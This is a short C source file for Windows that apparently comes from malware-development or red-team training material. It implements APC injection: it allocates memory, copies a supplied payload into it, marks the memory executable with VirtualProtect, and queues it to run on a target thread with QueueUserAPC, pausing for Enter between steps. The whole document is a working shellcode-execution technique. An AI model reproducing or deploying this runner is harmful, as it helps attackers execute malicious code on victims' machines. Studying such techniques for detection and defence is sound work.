#include "APCInjection.h"

BOOL RunViaApcInjection(HANDLE hThread, PBYTE pPayload, SIZE_T sPayloadSize) {
	PVOID pAddress = NULL;
	DWORD dwOldProtection = NULL;

	pAddress = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!pAddress) {
		printf("[!] VirtualAlloc Failed with an Error: %ld\n", GetLastError());
		return FALSE;
	}

	printf("[+] Memory Allocated: %p, Press Enter to Continue...\n", pAddress);
	getchar();

	memcpy(pAddress, pPayload, sPayloadSize);

	printf("[+] Payload memcpy to Memory, Press Enter to Continue...\n");
	getchar();

	if (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtect Failed with an Error: %ld\n", GetLastError());
		return FALSE;
	}

	printf("[+] Press Enter to APC Inject...\n");
	getchar();

	if (!QueueUserAPC((PAPCFUNC)pAddress, hThread, NULL)) {
		printf("[!] QueueUserAPC Failed with an Error: %ld\n", GetLastError());
		return FALSE;
	}

	return TRUE;
}